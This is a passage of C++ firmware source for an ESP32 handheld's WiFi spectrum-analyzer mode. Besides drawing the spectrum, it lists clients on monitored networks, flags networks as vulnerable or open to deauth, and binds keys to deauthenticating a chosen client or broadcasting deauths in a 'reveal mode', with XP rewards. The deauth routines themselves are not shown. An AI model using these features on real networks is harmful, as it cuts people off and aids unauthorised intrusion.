// HOG ON SPECTRUM Mode - WiFi Spectrum Analyzer Implementation

#include "spectrum.h"
#include "oink.h"
#include "../core/config.h"
#include "../audio/sfx.h"
#include "../core/network_recon.h"
#include "../core/oui.h"
#include "../core/stress_test.h"
#include "../core/wsl_bypasser.h"
#include "../core/wifi_utils.h"
#include "../core/heap_policy.h"
#include "../core/xp.h"
#include "../ui/display.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>  // For heap_caps_get_largest_free_block
#include <NimBLEDevice.h>   // For BLE coexistence check
#include <algorithm>
#include <atomic>
#include <cmath>
#include <ctype.h>
#include <string.h>

// Layout constants - spectrum fills canvas above XP bar
const int SPECTRUM_LEFT = 20;       // Space for dB labels
const int SPECTRUM_RIGHT = 238;     // Right edge
const int SPECTRUM_TOP = 2;         // Top margin
const int SPECTRUM_BOTTOM = 75;     // Above channel labels
const int CHANNEL_LABEL_Y = 78;     // Channel number row
const int XP_BAR_Y = 91;            // XP bar starts here

// RSSI scale
const int8_t RSSI_MIN = -95;        // Bottom of scale (weak signals)
const int8_t RSSI_MAX = -30;        // Top of scale (very strong)

// View defaults
const float DEFAULT_CENTER_MHZ = 2437.0f;  // Channel 6
const float DEFAULT_WIDTH_MHZ = 60.0f;     // ~12 channels visible
const float MIN_CENTER_MHZ = 2412.0f;      // Channel 1
const float MAX_CENTER_MHZ = 2472.0f;      // Channel 13
const float PAN_STEP_MHZ = 5.0f;           // One channel per pan

// Timing
const uint32_t STALE_TIMEOUT_MS = 5000;    // Remove networks after 5s silence
const uint32_t UPDATE_INTERVAL_MS = 100;   // 10 FPS update rate

// Memory limits
const size_t MAX_SPECTRUM_NETWORKS = 100;  // Cap networks to prevent OOM

// Gaussian LUT for spectrum lobes (sigma=6.6, distances -15 to +15 MHz)
// Pre-computed: exp(-0.5 * dist^2 / 43.56) for each integer distance
// Eliminates expensive expf() calls in hot render path (~6000/sec savings)
// Formula: exp(-0.5 * d^2 / 43.56) where d = distance in MHz
static const float GAUSSIAN_LUT[31] = {
    0.0756f, 0.1052f, 0.1437f, 0.1914f, 0.2493f,  // -15 to -11
    0.3173f, 0.3946f, 0.4797f, 0.5695f, 0.6616f,  // -10 to -6
    0.7506f, 0.8321f, 0.9019f, 0.9551f, 0.9885f,  // -5 to -1
    1.0000f,                                        // 0 (center)
    0.9885f, 0.9551f, 0.9019f, 0.8321f, 0.7506f,  // +1 to +5
    0.6616f, 0.5695f, 0.4797f, 0.3946f, 0.3173f,  // +6 to +10
    0.2493f, 0.1914f, 0.1437f, 0.1052f, 0.0756f   // +11 to +15
};

// Static members
bool SpectrumMode::running = false;
std::atomic<bool> SpectrumMode::busy{false};  // [BUG7 FIX] Atomic for cross-core visibility
std::vector<SpectrumNetwork> SpectrumMode::networks;
float SpectrumMode::viewCenterMHz = DEFAULT_CENTER_MHZ;
float SpectrumMode::viewWidthMHz = DEFAULT_WIDTH_MHZ;
int SpectrumMode::selectedIndex = -1;
uint32_t SpectrumMode::lastUpdateTime = 0;
bool SpectrumMode::keyWasPressed = false;
uint8_t SpectrumMode::currentChannel = 1;
uint32_t SpectrumMode::lastHopTime = 0;
uint32_t SpectrumMode::startTime = 0;
SpectrumFilter SpectrumMode::filter = SpectrumFilter::ALL;
volatile bool SpectrumMode::pendingReveal = false;
char SpectrumMode::pendingRevealSSID[33] = {0};
volatile bool SpectrumMode::pendingNetworkAdd = false;
SpectrumNetwork SpectrumMode::pendingNetwork = {0};

// Client monitoring state
bool SpectrumMode::monitoringNetwork = false;
int SpectrumMode::monitoredNetworkIndex = -1;
uint8_t SpectrumMode::monitoredBSSID[6] = {0};
uint8_t SpectrumMode::monitoredChannel = 0;
int SpectrumMode::clientScrollOffset = 0;
int SpectrumMode::selectedClientIndex = 0;
uint32_t SpectrumMode::lastClientPrune = 0;
uint8_t SpectrumMode::clientsDiscoveredThisSession = 0;
volatile bool SpectrumMode::pendingClientBeep = false;
volatile uint8_t SpectrumMode::pendingNetworkXP = 0;  // Deferred XP for new networks (avoids callback crash)

// Achievement tracking for client monitor (v0.1.6)
uint32_t SpectrumMode::clientMonitorEntryTime = 0;
uint8_t SpectrumMode::deauthsThisMonitor = 0;
uint32_t SpectrumMode::firstDeauthTime = 0;

// Client detail popup state
bool SpectrumMode::clientDetailActive = false;
uint8_t SpectrumMode::detailClientMAC[6] = {0};  // MAC of client being viewed

// Dial mode state (tilt-to-tune when device upright)
bool SpectrumMode::dialMode = false;
bool SpectrumMode::dialLocked = false;
bool SpectrumMode::dialWasUpright = false;
uint8_t SpectrumMode::dialChannel = 7;
float SpectrumMode::dialPositionTarget = 7.0f;
float SpectrumMode::dialPositionSmooth = 7.0f;
uint32_t SpectrumMode::lastDialUpdate = 0;
uint32_t SpectrumMode::dialModeEntryTime = 0;
volatile uint32_t SpectrumMode::ppsCounter = 0;
uint32_t SpectrumMode::displayPps = 0;
uint32_t SpectrumMode::lastPpsUpdate = 0;

// Reveal mode state
bool SpectrumMode::revealingClients = false;
uint32_t SpectrumMode::revealStartTime = 0;
uint32_t SpectrumMode::lastRevealBurst = 0;

void SpectrumMode::init() {
    networks.clear();
    networks.shrink_to_fit();  // Release vector capacity
    viewCenterMHz = DEFAULT_CENTER_MHZ;
    viewWidthMHz = DEFAULT_WIDTH_MHZ;
    selectedIndex = -1;
    keyWasPressed = false;
    currentChannel = 1;
    lastHopTime = 0;
    startTime = 0;
    busy = false;
    pendingReveal = false;
    pendingRevealSSID[0] = 0;
    pendingNetworkAdd = false;
    memset(&pendingNetwork, 0, sizeof(pendingNetwork));
    filter = SpectrumFilter::ALL;
    
    // Reset client monitoring state
    monitoringNetwork = false;
    monitoredNetworkIndex = -1;
    memset(monitoredBSSID, 0, 6);
    monitoredChannel = 0;
    clientScrollOffset = 0;
    selectedClientIndex = 0;
    lastClientPrune = 0;
    clientsDiscoveredThisSession = 0;
    pendingClientBeep = false;
    clientDetailActive = false;
    revealingClients = false;
    revealStartTime = 0;
    lastRevealBurst = 0;
    
    // Reset dial mode state
    dialMode = false;
    dialLocked = false;
    dialWasUpright = false;
    dialChannel = 7;
    dialPositionTarget = 7.0f;
    dialPositionSmooth = 7.0f;
    lastDialUpdate = 0;
    dialModeEntryTime = 0;
    ppsCounter = 0;
    displayPps = 0;
    lastPpsUpdate = 0;
}

void SpectrumMode::start() {
    if (running) return;
    
    Serial.println("[SPECTRUM] Starting HOG ON SPECTRUM mode...");
    
    // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
    if (!NetworkRecon::isRunning()) {
        NetworkRecon::start();
    }
    
    // Reserve memory for spectrum-specific network data
    networks.reserve(MAX_SPECTRUM_NETWORKS);
    init();
    
    // Register our packet callback for visualization
    NetworkRecon::setPacketCallback(promiscuousCallback);
    
    running = true;
    lastUpdateTime = millis();
    startTime = millis();
    
    Display::setWiFiStatus(true);
    Serial.printf("[SPECTRUM] Running - %d networks from recon\n", NetworkRecon::getNetworkCount());
}

void SpectrumMode::stop() {
    if (!running) return;
    
    Serial.println("[SPECTRUM] Stopping...");
    
    // Block callback during shutdown sequence
    busy = true;
    
    // Clear our packet callback (NetworkRecon keeps running)
    NetworkRecon::setPacketCallback(nullptr);
    
    // [P4] Ensure monitoring is disabled
    monitoringNetwork = false;
    
    // Unlock channel if we locked it
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    
    running = false;
    Display::setWiFiStatus(false);
    
    // FIX: Release vector capacity to recover heap
    networks.clear();
    networks.shrink_to_fit();
    
    busy = false;
    Serial.println("[SPECTRUM] Stopped - heap recovered");
}

void SpectrumMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Process deferred reveal logging (from callback)
    if (pendingReveal) {
        Serial.printf("[SPECTRUM] Hidden SSID revealed: %s\n", pendingRevealSSID);
        pendingReveal = false;
    }
    
    // Process deferred client beep (from callback)
    if (pendingClientBeep) {
        pendingClientBeep = false;
        SFX::play(SFX::CLIENT_FOUND);
    }
    
    // Process deferred XP from onBeacon callback (avoids level-up popup crash)
    // XP::addXP can trigger Display::showLevelUp which blocks - unsafe from WiFi callback
    if (pendingNetworkXP > 0) {
        uint8_t xpCount = pendingNetworkXP;
        pendingNetworkXP = 0;  // Clear before processing (atomic enough for single producer)
        for (uint8_t i = 0; i < xpCount; i++) {
            XP::addXP(XPEvent::NETWORK_FOUND);
        }
    }
    
    // Process deferred network add from onBeacon callback (ESP32 dual-core race fix)
    // push_back can reallocate vector, invalidating iterators in concurrent callback
    // [BUG FIX] Technique 4 (reserve pattern) + Technique 7 (recovery) per HEAP_MANAGEMENT.txt
    if (pendingNetworkAdd) {
        // Technique 4: Reserve capacity OUTSIDE busy region
        bool canGrow = (networks.size() < networks.capacity());
        
        if (!canGrow && networks.size() < MAX_SPECTRUM_NETWORKS) {
            // Check heap threshold (20KB) before growth operations
            if (ESP.getFreeHeap() > HeapPolicy::kMinHeapForSpectrumGrowth) {
                networks.reserve(networks.capacity() + 10);  // Grow by 10 slots
                canGrow = true;
            } else {
                // Technique 7 Level 1: Recovery attempt - prune stale networks first
                busy = true;
                pruneStale();  // May free 2-20KB depending on stale count
                busy = false;
                
                // Re-check heap after recovery
                if (ESP.getFreeHeap() > HeapPolicy::kMinHeapForSpectrumGrowth) {
                    networks.reserve(networks.capacity() + 10);
                    canGrow = true;
                }
                // else: recovery failed, skip this add (better than crash)
            }
        }
        
        busy = true;  // Block callback during vector modification
        if (networks.size() < MAX_SPECTRUM_NETWORKS && canGrow) {
            networks.push_back(pendingNetwork);
            // Auto-select first network
            if (selectedIndex < 0) {
                selectedIndex = 0;
            }
        }
        pendingNetworkAdd = false;
        busy = false;
    }
    
    // [P2] Verify monitored network still exists and signal is fresh
    if (monitoringNetwork) {
        bool networkLost = false;
        
        // Check if network got shuffled out
        if (monitoredNetworkIndex >= (int)networks.size() ||
            !macEqual(networks[monitoredNetworkIndex].bssid, monitoredBSSID)) {
            networkLost = true;
        }
        // Check signal timeout (no beacon for 15 seconds)
        else if (now - networks[monitoredNetworkIndex].lastSeen > SIGNAL_LOST_TIMEOUT_MS) {
            networkLost = true;
        }
        
        if (networkLost) {
            // Block callback during exit sequence (has delays)
            busy = true;
            
            // Descending tones for signal lost - non-blocking
            SFX::play(SFX::SIGNAL_LOST);
            Display::showToast("SIGNAL LOST");
            delay(300);  // Brief pause so user sees toast
            
            busy = false;
            exitClientMonitor();
        }
    }
    
    // Handle input
    handleInput();
    
    // Update dial mode (tilt-to-tune when upright)
    updateDialChannel();
    
    // Channel hopping - skip when monitoring a specific network OR in dial mode
    if (!monitoringNetwork && !dialMode) {
        if (now - lastHopTime > 100) {  // 100ms per channel = ~1.3s full sweep
            currentChannel = (currentChannel % 13) + 1;
            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
            lastHopTime = now;
        }
    }
    
    // Prune stale networks periodically (only when NOT monitoring)
    if (!monitoringNetwork && now - lastUpdateTime > UPDATE_INTERVAL_MS) {
        pruneStale();
        lastUpdateTime = now;
    }
    
    // Prune stale clients when monitoring
    if (monitoringNetwork && (now - lastClientPrune > 5000)) {
        lastClientPrune = now;
        pruneStaleClients();
    }
    
    // Update reveal mode (periodic broadcast deauths)
    if (monitoringNetwork && revealingClients) {
        updateRevealMode();
    }
    
    // N13TZSCH3 achievement - stare into the ether for 15 minutes
    if (startTime > 0 && (now - startTime) >= 15 * 60 * 1000) {
        if (!XP::hasAchievement(ACH_NIETZSWINE)) {
            XP::unlockAchievement(ACH_NIETZSWINE);
            Display::showToast("THE ETHER DEAUTHS BACK");
        }
    }
}

void SpectrumMode::handleInput() {
    // [P11] Single state check at TOP - no fall-through!
    if (monitoringNetwork) {
        handleClientMonitorInput();
        return;
    }
    
    bool anyPressed = M5Cardputer.Keyboard.isPressed();
    
    if (!anyPressed) {
        keyWasPressed = false;
        return;
    }
    
    if (keyWasPressed) return;
    keyWasPressed = true;
    
    Display::resetDimTimer();
    
    auto keys = M5Cardputer.Keyboard.keysState();
    
    // Pan spectrum with , (left) and / (right)
    if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        viewCenterMHz = fmax(MIN_CENTER_MHZ, viewCenterMHz - PAN_STEP_MHZ);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        viewCenterMHz = fmin(MAX_CENTER_MHZ, viewCenterMHz + PAN_STEP_MHZ);
    }
    
    // F key: cycle filter mode
    if (M5Cardputer.Keyboard.isKeyPressed('f') || M5Cardputer.Keyboard.isKeyPressed('F')) {
        filter = static_cast<SpectrumFilter>((static_cast<int>(filter) + 1) % 4);
        // If selected network no longer matches filter, find first matching
        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            if (!matchesFilter(networks[selectedIndex])) {
                selectedIndex = -1;
                for (size_t i = 0; i < networks.size(); i++) {
                    if (matchesFilter(networks[i])) {
                        selectedIndex = (int)i;
                        viewCenterMHz = channelToFreq(networks[i].channel);
                        break;
                    }
                }
            }
        }
    }
    
    // Cycle through matching networks with ; and .
    if (M5Cardputer.Keyboard.isKeyPressed(';') && !networks.empty()) {
        int startIdx = selectedIndex;
        int count = 0;
        do {
            selectedIndex = (selectedIndex - 1 + (int)networks.size()) % (int)networks.size();
            count++;
        } while (!matchesFilter(networks[selectedIndex]) && count < (int)networks.size());
        
        if (!matchesFilter(networks[selectedIndex])) {
            selectedIndex = startIdx;  // No match found, stay put
        } else if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
        }
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.') && !networks.empty()) {
        int startIdx = selectedIndex;
        int count = 0;
        do {
            selectedIndex = (selectedIndex + 1) % (int)networks.size();
            count++;
        } while (!matchesFilter(networks[selectedIndex]) && count < (int)networks.size());
        
        if (!matchesFilter(networks[selectedIndex])) {
            selectedIndex = startIdx;  // No match found, stay put
        } else if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
        }
    }
    
    // Enter: start monitoring selected network
    if (keys.enter && !networks.empty()) {
        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            enterClientMonitor();
        }
    }
    
    // Space: toggle dial lock when in dial mode
    if (M5Cardputer.Keyboard.isKeyPressed(' ') && dialMode) {
        dialLocked = !dialLocked;
        SFX::play(SFX::CLICK);
    }
}

// Handle input when in client monitor overlay [P11] [P13] [P14]
void SpectrumMode::handleClientMonitorInput() {
    bool anyPressed = M5Cardputer.Keyboard.isPressed();
    
    if (!anyPressed) {
        keyWasPressed = false;
        return;
    }
    
    if (keyWasPressed) return;
    keyWasPressed = true;
    
    Display::resetDimTimer();
    
    // If detail popup is active, any key closes it
    if (clientDetailActive) {
        clientDetailActive = false;
        return;
    }
    
    // If revealing, any key exits reveal mode
    if (revealingClients) {
        exitRevealMode();
        return;
    }
    
    // W key: enter reveal mode (broadcast deauth to discover clients)
    if (M5Cardputer.Keyboard.isKeyPressed('w') || M5Cardputer.Keyboard.isKeyPressed('W')) {
        enterRevealMode();
        return;
    }
    
    // Backspace - go back
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        exitClientMonitor();
        return;
    }
    
    // B key: add to BOAR BROS and exit [P13]
    if (M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')) {
        if (monitoredNetworkIndex >= 0 && 
            monitoredNetworkIndex < (int)networks.size()) {
            // Add to BOAR BROS via OinkMode
            OinkMode::excludeNetworkByBSSID(networks[monitoredNetworkIndex].bssid,
                                             networks[monitoredNetworkIndex].ssid);
            Display::showToast("EXCLUDED - RETURNING");
            delay(500);
            exitClientMonitor();
        }
        return;
    }
    
    // Get client count safely [P14]
    int clientCount = 0;
    if (monitoredNetworkIndex >= 0 && 
        monitoredNetworkIndex < (int)networks.size()) {
        clientCount = networks[monitoredNetworkIndex].clientCount;
    }
    
    // Navigation only if clients exist [P14]
    if (clientCount > 0) {
        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            selectedClientIndex = max(0, selectedClientIndex - 1);
            // Adjust scroll if needed
            if (selectedClientIndex < clientScrollOffset) {
                clientScrollOffset = selectedClientIndex;
            }
        }
        
        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            selectedClientIndex = min(clientCount - 1, selectedClientIndex + 1);
            // Adjust scroll if needed
            if (selectedClientIndex >= clientScrollOffset + VISIBLE_CLIENTS) {
                clientScrollOffset = selectedClientIndex - VISIBLE_CLIENTS + 1;
            }
        }
        
        // D key: show client detail popup
        if (M5Cardputer.Keyboard.isKeyPressed('d') || M5Cardputer.Keyboard.isKeyPressed('D')) {
            if (selectedClientIndex >= 0 && selectedClientIndex < clientCount) {
                // Store MAC of client we're viewing - close popup if this client disappears
                memcpy(detailClientMAC, networks[monitoredNetworkIndex].clients[selectedClientIndex].mac, 6);
                clientDetailActive = true;
            }
            return;
        }
        
        // Enter: deauth selected client [P14]
        if (M5Cardputer.Keyboard.keysState().enter) {
            deauthClient(selectedClientIndex);
        }
    }
}

void SpectrumMode::draw(M5Canvas& canvas) {
    canvas.fillSprite(COLOR_BG);
    
    // Draw client overlay when monitoring, otherwise spectrum
    if (monitoringNetwork) {
        drawClientOverlay(canvas);
    } else {
        // Draw spectrum visualization
        drawAxis(canvas);
        drawSpectrum(canvas);
        drawChannelMarkers(canvas);
        drawFilterBar(canvas);
        
        // Draw dial mode info (when device upright)
        drawDialInfo(canvas);
        
        // Draw status indicators if network is selected
        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            const auto& net = networks[selectedIndex];
            canvas.setTextSize(1);
            canvas.setTextColor(COLOR_FG);
            canvas.setTextDatum(top_left);
            
            // Build status string without heap churn
            char status[24];
            size_t pos = 0;
            status[0] = '\0';
            if (isVulnerable(net.authmode)) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[VULN!]");
            }
            if (!net.hasPMF) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[DEAUTH]");
            }
            if (OinkMode::isExcluded(net.bssid)) {
                pos += snprintf(status + pos, sizeof(status) - pos, "[BRO]");
            }
            if (pos > 0) {
                canvas.drawString(status, SPECTRUM_LEFT + 2, SPECTRUM_TOP);
            }
        }
    }
    
    // XP now shows in top bar on gain (Option B)
}

void SpectrumMode::drawAxis(M5Canvas& canvas) {
    // Y-axis line
    canvas.drawFastVLine(SPECTRUM_LEFT - 2, SPECTRUM_TOP, SPECTRUM_BOTTOM - SPECTRUM_TOP, COLOR_FG);
    
    // dB labels on left
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_FG);
    canvas.setTextDatum(middle_right);
    
    for (int8_t rssi = -30; rssi >= -90; rssi -= 20) {
        int y = rssiToY(rssi);
        // Shift label down if it would be cut off by top bar (font height ~8px, so 4px minimum)
        int labelY = (y < 6) ? 6 : y;
        canvas.drawFastHLine(SPECTRUM_LEFT - 4, y, 3, COLOR_FG);
        char rssiLabel[6];
        snprintf(rssiLabel, sizeof(rssiLabel), "%d", rssi);
        canvas.drawString(rssiLabel, SPECTRUM_LEFT - 5, labelY);
    }
    
    // Baseline
    canvas.drawFastHLine(SPECTRUM_LEFT, SPECTRUM_BOTTOM, SPECTRUM_RIGHT - SPECTRUM_LEFT, COLOR_FG);
}

void SpectrumMode::drawChannelMarkers(M5Canvas& canvas) {
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_FG);
    canvas.setTextDatum(top_center);
    
    // ==[ DIAL MODE: SLIDING HIGHLIGHT BOX ]==
    // Draw BEFORE channel numbers so numbers appear inverted on top
    if (dialMode) {
        // Calculate X position from smooth dial position
        // Map channel position (1-13) to X coordinate
        float clampedPos = constrain(dialPositionSmooth, 1.0f, 13.0f);
        float freq = 2412.0f + (clampedPos - 1.0f) * 5.0f;
        int xCenter = freqToX(freq);
        
        int boxW = 14;
        int boxH = 10;
        int boxY = CHANNEL_LABEL_Y - 1;
        int boxX = xCenter - boxW / 2;
        
        // Draw filled highlight box
        canvas.fillRect(boxX, boxY, boxW, boxH, COLOR_FG);
        
        // Lock indicator: thicker border when locked
        if (dialLocked) {
            canvas.drawRect(boxX - 1, boxY - 1, boxW + 2, boxH + 2, COLOR_FG);
        }
    }
    
    // Draw channel numbers for visible channels
    for (uint8_t ch = 1; ch <= 13; ch++) {
        float freq = channelToFreq(ch);
        int x = freqToX(freq);
        
        // Only draw if in visible area
        if (x >= SPECTRUM_LEFT && x <= SPECTRUM_RIGHT) {
            // Tick mark
            canvas.drawFastVLine(x, SPECTRUM_BOTTOM, 3, COLOR_FG);
            
            // In dial mode: invert the channel number that's under the highlight box
            bool isDialSelected = dialMode && (fabsf(dialPositionSmooth - (float)ch) < 0.6f);
            if (isDialSelected) {
                canvas.setTextColor(COLOR_BG);  // inverted for selected channel
            } else {
                canvas.setTextColor(COLOR_FG);
            }
            
            // Channel number
            char chLabel[4];
            snprintf(chLabel, sizeof(chLabel), "%u", ch);
            canvas.drawString(chLabel, x, CHANNEL_LABEL_Y);
        }
    }
    canvas.setTextColor(COLOR_FG);  // reset
    
    // Scroll indicators
    float leftEdge = viewCenterMHz - viewWidthMHz / 2;
    float rightEdge = viewCenterMHz + viewWidthMHz / 2;
    
    canvas.setTextDatum(middle_left);
    if (leftEdge > 2407) {  // More channels to the left
        canvas.drawString("<", 2, SPECTRUM_BOTTOM / 2);
    }
    canvas.setTextDatum(middle_right);
    if (rightEdge < 2477) {  // More channels to the right
        canvas.drawString(">", SPECTRUM_RIGHT + 1, SPECTRUM_BOTTOM / 2);
    }
}

// Draw filter indicator bar at Y=91 (old XP bar area)
void SpectrumMode::drawFilterBar(M5Canvas& canvas) {
    // Count networks matching current filter
    int matchCount = 0;
    for (const auto& net : networks) {
        if (matchesFilter(net)) matchCount++;
    }
    
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_FG);
    canvas.setTextDatum(top_left);
    
    // Build filter status string
    char buf[40];
    const char* filterName;
    const char* suffix;
    
    switch (filter) {
        case SpectrumFilter::VULN:
            filterName = "VULN";
            suffix = matchCount == 1 ? "TARGET" : "TARGETS";
            break;
        case SpectrumFilter::SOFT:
            filterName = "SOFT";
            suffix = matchCount == 1 ? "TARGET" : "TARGETS";
            break;
        case SpectrumFilter::HIDDEN:
            filterName = "HIDDEN";
            suffix = "FOUND";
            break;
        case SpectrumFilter::ALL:
        default:
            filterName = "ALL";
            suffix = matchCount == 1 ? "AP" : "APs";
            break;
    }
    
    snprintf(buf, sizeof(buf), "[F] %s: %d %s", filterName, matchCount, suffix);
    canvas.drawString(buf, 2, XP_BAR_Y);
    
    // Stress test indicator (right side)
    if (StressTest::isActive()) {
        char stressBuf[24];
        snprintf(stressBuf, sizeof(stressBuf), "[T] STRESS %lu/s", StressTest::getRate());
        canvas.setTextDatum(top_right);
        canvas.drawString(stressBuf, 238, XP_BAR_Y);
        canvas.setTextDatum(top_left);
    }
}

// Draw dial mode info bar (top-right when device upright)
void SpectrumMode::drawDialInfo(M5Canvas& canvas) {
    if (!dialMode) return;
    
    // Show channel info at top-right, above spectrum
    int infoY = 4;  // top margin
    
    char info[32];
    uint16_t freq = (uint16_t)channelToFreq(dialChannel);  // MHz as integer
    
    // Format pps
    char ppsStr[8];
    if (displayPps >= 1000) {
        snprintf(ppsStr, sizeof(ppsStr), "%.1fk", displayPps / 1000.0f);
    } else {
        snprintf(ppsStr, sizeof(ppsStr), "%lu", displayPps);
    }
    
    // Format: "CH7 2442MHz 42pps" or "LCK7 2442MHz 42pps"
    if (dialLocked) {
        snprintf(info, sizeof(info), "LCK%d %dMHz %spps", dialChannel, freq, ppsStr);
    } else {
        snprintf(info, sizeof(info), "CH%d %dMHz %spps", dialChannel, freq, ppsStr);
    }
    
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_FG);
    canvas.setTextDatum(top_right);  // top-right align
    canvas.drawString(info, 236, infoY);
    canvas.setTextDatum(top_left);  // reset
}

// Draw client monitoring overlay [P3] [P12] [P14] [P15]
void SpectrumMode::drawClientOverlay(M5Canvas& canvas) {
    // [P12] Draw in mainCanvas area only (y=0 to y=90 max)
    // XP bar is at y=91, drawn separately in draw()
    
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_FG, COLOR_BG);
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        canvas.setTextDatum(middle_center);
        canvas.drawString("NETWORK LOST", 120, 45);
        return;
    }
    
    SpectrumNetwork& net = networks[monitoredNetworkIndex];
    
    // Header: SSID or <hidden> [P15] - CH removed (shown in bottom bar)
    char header[40];
    if (net.ssid[0] == 0) {
        snprintf(header, sizeof(header), "CLIENTS: <HIDDEN>");
    } else {
        char truncSSID[24];
        strncpy(truncSSID, net.ssid, 22);
        truncSSID[22] = '\0';  // [P9] Explicit null termination
        // Uppercase for readability
        for (int i = 0; truncSSID[i]; i++) truncSSID[i] = toupper(truncSSID[i]);
        snprintf(header, sizeof(header), "CLIENTS: %s", truncSSID);
    }
    canvas.setTextDatum(top_left);
    canvas.drawString(header, 4, 2);
    
    // Empty list message [P14]
    if (net.clientCount == 0) {
        canvas.setTextDatum(middle_center);
        canvas.drawString("NEGATIVE CONTACT", 120, 40);
        canvas.drawString("RECON IN PROGRESS...", 120, 55);
        return;
    }
    
    // Client list (starts at y=18, 16px per line, max 4 visible)
    const int LINE_HEIGHT = 16;
    const int START_Y = 18;
    
    for (int i = 0; i < VISIBLE_CLIENTS && (i + clientScrollOffset) < net.clientCount; i++) {
        int clientIdx = i + clientScrollOffset;
        
        // Bounds check [P3]
        if (clientIdx >= net.clientCount) break;
        
        SpectrumClient& client = net.clients[clientIdx];
        
        int y = START_Y + (i * LINE_HEIGHT);
        bool selected = (clientIdx == selectedClientIndex);
        
        // Highlight selected row
        if (selected) {
            canvas.fillRect(0, y, 240, LINE_HEIGHT, COLOR_FG);
            canvas.setTextColor(COLOR_BG, COLOR_FG);
        } else {
            canvas.setTextColor(COLOR_FG, COLOR_BG);
        }
        
        // Format: "1. Vendor  XX:XX:XX  -XXdB >> Xs"
        uint32_t age = (millis() - client.lastSeen) / 1000;
        char line[52];
        
        // Use cached vendor from discovery time - uppercase for display
        const char* vendorRaw = client.vendor ? client.vendor : "UNKNOWN";
        char vendorUpper[10];
        strncpy(vendorUpper, vendorRaw, 9);
        vendorUpper[9] = '\0';
        for (int i = 0; vendorUpper[i]; i++) vendorUpper[i] = toupper(vendorUpper[i]);
        
        // Calculate relative position: client vs AP signal
        // Positive delta = client closer to us than AP
        int delta = client.rssi - net.rssi;
        const char* arrow;
        if (delta > 10) arrow = ">>";       // Much closer to us
        else if (delta > 3) arrow = "> ";   // Closer
        else if (delta < -10) arrow = "<<"; // Much farther
        else if (delta < -3) arrow = "< ";  // Farther
        else arrow = "==";                  // Same distance
        
        // [P9] Safe string formatting with bounds
        // Show vendor (8 chars) + last 4 octets + arrow for hunting
        snprintf(line, sizeof(line), "%d.%-8s %02X:%02X:%02X:%02X %03ddB %02luS %s",
            clientIdx + 1,
            vendorUpper,
            client.mac[2], client.mac[3], client.mac[4], client.mac[5],
            client.rssi,
            age,
            arrow);
        
        canvas.setTextDatum(top_left);
        canvas.drawString(line, 4, y + 2);
    }
    
    // Scroll indicators
    canvas.setTextColor(COLOR_FG, COLOR_BG);
    if (clientScrollOffset > 0) {
        canvas.setTextDatum(top_right);
        canvas.drawString("^", 236, 18);  // More above
    }
    if (clientScrollOffset + VISIBLE_CLIENTS < net.clientCount) {
        canvas.setTextDatum(bottom_right);
        canvas.drawString("v", 236, 82);  // More below
    }
    
    // Draw client detail popup if active
    if (clientDetailActive) {
        drawClientDetail(canvas);
    }
    
    // Draw reveal mode overlay (persistent toast with live count)
    if (revealingClients) {
        int boxW = 160;
        int boxH = 40;
        int boxX = (240 - boxW) / 2;
        int boxY = (90 - boxH) / 2;
        
        // Black border then inverted fill
        canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, COLOR_BG);
        canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, COLOR_FG);
        
        // Black text on inverted background
        canvas.setTextColor(COLOR_BG, COLOR_FG);
        canvas.setTextDatum(middle_center);
        canvas.drawString("WAKIE WAKIE", 120, boxY + 12);
        
        // Show live client count
        char countStr[24];
        snprintf(countStr, sizeof(countStr), "FOUND: %d", net.clientCount);
        canvas.drawString(countStr, 120, boxY + 28);
    }
}

// Draw client detail popup - modal overlay with full client info
void SpectrumMode::drawClientDetail(M5Canvas& canvas) {
    // Bounds validation - close popup if client no longer exists
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        clientDetailActive = false;
        return;
    }
    
    const SpectrumNetwork& net = networks[monitoredNetworkIndex];
    
    if (selectedClientIndex < 0 || selectedClientIndex >= net.clientCount) {
        clientDetailActive = false;
        return;
    }
    
    const SpectrumClient& client = net.clients[selectedClientIndex];
    
    // Close popup if viewed client changed (was pruned, index now points to different client)
    if (memcmp(client.mac, detailClientMAC, 6) != 0) {
        clientDetailActive = false;
        return;
    }
    
    // Modal box dimensions - medium size per design spec
    const int boxW = 200;
    const int boxH = 75;
    const int boxX = (canvas.width() - boxW) / 2;
    const int boxY = (canvas.height() - boxH) / 2 - 5;
    
    // Black border then pink fill (standard popup pattern)
    canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, COLOR_BG);
    canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, COLOR_FG);
    
    // Black text on pink background
    canvas.setTextColor(COLOR_BG, COLOR_FG);
    canvas.setTextDatum(top_center);
    canvas.setTextSize(1);
    
